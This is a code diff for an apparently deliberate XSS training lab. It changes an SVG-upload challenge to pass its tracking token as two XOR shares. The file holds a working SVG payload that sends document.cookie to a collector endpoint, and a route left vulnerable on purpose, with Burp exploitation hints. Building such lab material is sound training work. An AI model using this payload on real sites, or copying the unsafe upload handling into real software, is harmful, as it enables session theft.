@@ -6,6 +6,7 @@ const path = require('path');
 const { DB_PATH } = require('../../../lib/db');
 const { page, esc, errorPage, claimBox, fixCta } = require('../../../lib/page');
 const { xssNonce, xssNonceTag, siteFrame, backLinks } = require('../shared');
+const { tokenShareParams, COMBINE_FROM_SEARCH_JS } = require('../../../lib/jstoken');
 
 const router = express.Router();
 
@@ -15,7 +16,7 @@ function ensureUploadDir() {
   fs.mkdirSync(UPLOAD_DIR, { recursive: true });
 }
 
-const SVG_PAYLOAD = "<svg xmlns=\"http://www.w3.org/2000/svg\"><script><![CDATA[fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+new URLSearchParams(location.search).get('n'))]]></script></svg>";
+const SVG_PAYLOAD = "<svg xmlns=\"http://www.w3.org/2000/svg\"><script><![CDATA[fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+(" + COMBINE_FROM_SEARCH_JS + "))]]></script></svg>";
 
 router.get('/svg', (req, res) => {
   let files = [];
@@ -27,12 +28,13 @@ router.get('/svg', (req, res) => {
       .slice(0, 20);
   } catch (e) { /* no uploads yet */ }
   // The uploaded SVG opens as its own document, so it cannot see window.__px.
-  // The file links carry the page-bound nonce in the query string instead, and
-  // the payload reads it from location.search when it executes.
-  const svgNonce = xssNonce(req, 'xss-svg-upload');
+  // The file links carry the token's two share values in the query string
+  // instead of the raw token, and the payload combines them at runtime when
+  // it executes.
+  const svgShares = tokenShareParams(xssNonce(req, 'xss-svg-upload'));
   const rows = files.map(({ f, t }) => `<tr>
       <td>${esc(f)}</td><td>${esc(new Date(t).toISOString().slice(0, 16).replace('T', ' '))}</td>
-      <td><a href="/xss/uploads/${esc(f)}?n=${svgNonce}">Open</a></td></tr>`).join('');
+      <td><a href="/xss/uploads/${esc(f)}?pxa=${svgShares.pxa}&pxk=${svgShares.pxk}">Open</a></td></tr>`).join('');
   const list = rows
     ? `<div class="tbl-scroll"><table class="tbl">
         <caption class="sr-only">Uploaded avatars</caption>
@@ -57,7 +59,7 @@ router.get('/svg', (req, res) => {
       </form>
       <h3>Recent avatars</h3>
       ${list}`)}
-    ${claimBox({ vulnId: 'xss-svg-upload', payload: esc(SVG_PAYLOAD), statusUrl: '/xss/claim-status?v=xss-svg-upload', beaconInfo: 'The SVG opens as its own document, so window.__px is not defined there. The file link carries the token in ?n=; read it with new URLSearchParams(location.search).get(&quot;n&quot;). The file is parsed as XML, so a bare &amp; in the script would break parsing: keep the code inside a CDATA section.' })}
+    ${claimBox({ vulnId: 'xss-svg-upload', payload: esc(SVG_PAYLOAD), statusUrl: '/xss/claim-status?v=xss-svg-upload', beaconInfo: 'The SVG opens as its own document, so window.__px is not defined there. The file link carries the two share values of the token in ?pxa= and ?pxk=; your script must combine them at runtime (XOR the hex pairs) to rebuild the token, because the raw token is never written anywhere. The file is parsed as XML, so a bare &amp; in the script would break parsing: keep the code inside a CDATA section.' })}
     ${fixCta('xss', 'xss-svg-upload')}
     ${backLinks('xss-svg-upload')}
   `));
@@ -74,7 +76,8 @@ router.post('/svg', (req, res) => {
   ensureUploadDir();
   // VULN: attacker-controlled SVG is stored and served as image/svg+xml, so embedded scripts run on direct visit.
   fs.writeFileSync(path.join(UPLOAD_DIR, file), raw);
-  res.redirect('/xss/uploads/' + file + '?n=' + xssNonce(req, 'xss-svg-upload'));
+  const sp = tokenShareParams(xssNonce(req, 'xss-svg-upload'));
+  res.redirect('/xss/uploads/' + file + '?pxa=' + sp.pxa + '&pxk=' + sp.pxk);
 });
 
 router.get('/uploads/:file', (req, res) => {
@@ -95,7 +98,7 @@ module.exports = {
     hints: [
       'Intercept the Upload SVG POST in Burp Proxy and send it to Repeater. The uploaded file is served back as image/svg+xml: what is an SVG file, really?',
       'SVG is XML, and XML can contain <script> tags. When the browser opens the uploaded SVG directly (not as an <img>), the script runs.',
-      'In Repeater, upload an SVG whose <script> calls /xss/collect (parameters c, v=xss-svg-upload and n). The SVG is its own document, so read the token from the n parameter of the file URL instead of window.__px, then open the file link in your proxied browser. Remember the SVG is parsed as XML: keep a bare & inside a CDATA section.',
+      'In Repeater, upload an SVG whose <script> calls /xss/collect (parameters c, v=xss-svg-upload and n). The SVG is its own document, so rebuild the token at runtime from the pxa and pxk parameters of the file URL instead of window.__px, then open the file link in your proxied browser. Remember the SVG is parsed as XML: keep a bare & inside a CDATA section.',
     ],
     tools: 'BZ, B, C',
     how: 'In Burp, replay the Upload SVG POST in Repeater with a script-bearing SVG, then open the served file link in the proxied browser.',
